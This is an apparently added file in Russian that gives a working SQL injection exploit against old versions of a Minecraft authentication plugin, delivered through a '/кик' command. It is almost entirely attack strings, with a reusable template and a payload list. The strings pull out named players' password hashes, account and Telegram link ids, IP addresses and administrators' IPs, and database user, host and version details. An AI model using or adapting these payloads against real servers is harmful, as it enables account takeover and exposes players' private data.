@@ -1,0 +1,83 @@
+Старые версии плагина на авторизацию уязвимы к инъекциям
+
+Рабочий пример с хешем
+/кик ' AND FALSE UNION ALL SELECT p1.id p1.id, p2.player_id, p2.player_id_type, p2.hash_type, p2.last_ip, p2.unique_id, REPLACE(p2.password_hash, '$', '@'), p2.password_hash, p2.last_quit, p2.last_session_start 
+FROM (SELECT * FROM mc_auth_accounts WHERE player_id = 'r_asw
+' LIMIT 1) AS p1 
+CROSS JOIN (SELECT * FROM mc_auth_accounts WHERE player_id = 'Haker333_YT_' LIMIT 1) AS p2;#
+
+В данном случае ник CHL должен быть привязан к тг аккаунту с которого идет атака. А Haker333_YT_ является целью, чей хеш заполучить
+
+Извлекаем айди:
+/кик ' AND FALSE UNION ALL SELECT p1.id, p2.player_id, p2.player_id_type, p2.hash_type, p2.last_ip, p2.unique_id, REPLACE(p2.id, '$', '@'), p2.password_hash, p2.last_quit, p2.last_session_start 
+FROM (SELECT * FROM mc_auth_accounts WHERE player_id = 'r_asw
+' LIMIT 1) AS p1 
+CROSS JOIN (SELECT * FROM mc_auth_accounts WHERE player_id = 'BadikPlay' LIMIT 1) AS p2;#
+
+Извлекаем mysql юзера и хост
+/кик ' AND FALSE UNION ALL SELECT 
+p1.id, p2.player_id, p2.player_id_type, p2.hash_type, p2.last_ip, p2.unique_id, 
+CONCAT('User: ', CURRENT_USER(), ' | Host: ', @@hostname),
+CONCAT('Version: ', @@version, ' | Data: ', @@datadir),
+p2.last_quit, p2.last_session_start 
+FROM (SELECT * FROM mc_auth_accounts WHERE player_id = 'r_asw' LIMIT 1) AS p1 
+CROSS JOIN (SELECT * FROM mc_auth_accounts WHERE player_id = 'md_5' LIMIT 1) AS p2;#set
+
+Узнаем сколько стобцов в таблице с привязками
+/кик ' AND FALSE UNION ALL SELECT 
+p1.id,
+p2.player_id,
+p2.player_id_type,
+p2.hash_type,
+p2.last_ip,
+p2.unique_id,
+(SELECT COUNT(*) FROM auth_links),
+p2.password_hash,
+p2.last_quit,
+p2.last_session_start
+FROM (SELECT * FROM mc_auth_accounts WHERE player_id = 'r_asw' LIMIT 1) AS p1
+CROSS JOIN (SELECT * FROM mc_auth_accounts WHERE player_id = 'BadikPlay' LIMIT 1) AS p2;#
+
+Узнаем последний телеграм айди
+/кик ' AND FALSE UNION ALL SELECT 
+p1.id,
+p2.player_id,
+p2.player_id_type,
+p2.hash_type,
+p2.last_ip,
+p2.unique_id,
+(SELECT link_user_id FROM auth_links WHERE account_id = 182 AND link_type = 'telegram' LIMIT 1),
+p2.password_hash,
+p2.last_quit,
+p2.last_session_start
+FROM (SELECT * FROM mc_auth_accounts WHERE player_id = 'r_asw' LIMIT 1) AS p1
+CROSS JOIN (SELECT * FROM mc_auth_accounts WHERE player_id = 'BadikPlay' LIMIT 1) AS p2;#
+
+--------------------------------------------------------------------------------------------------------/
+Базовый код:
+
+/кик ' AND FALSE UNION ALL SELECT 
+p1.id,
+p2.player_id,
+p2.player_id_type,
+p2.hash_type,
+p2.last_ip,
+p2.unique_id,
+[PAYLOAD],
+p2.password_hash,
+p2.last_quit,
+p2.last_session_start
+FROM (SELECT * FROM mc_auth_accounts WHERE player_id = 'r_asw' LIMIT 1) AS p1
+CROSS JOIN (SELECT * FROM mc_auth_accounts WHERE player_id = 'TARGET' LIMIT 1) AS p2;#
+
+[PAYLOAD] Включая квадратные скобки заменяем на нужный нам пейлоад:
+---------------------------------------------------------------------------------------------------------/
+(SELECT GROUP_CONCAT(DISTINCT last_ip SEPARATOR ', ') FROM mc_auth_accounts WHERE player_id LIKE '%admin%') - Узнать айпи адреса администраторов MySQL
+
+(SELECT player_id FROM mc_auth_accounts WHERE id = 182 LIMIT 1) - Узнать ник из айди
+
+(SELECT last_ip FROM mc_auth_accounts WHERE player_id = 'BadikPlay' LIMIT 1) - Узнать айпи из ника
+
+(SELECT GROUP_CONCAT(player_id SEPARATOR ', ') FROM mc_auth_accounts WHERE last_ip = '127.0.0.1') - Список аккаунтов на айпи
+
+REPLACE(p2.password_hash, '$', '@'), - хеш
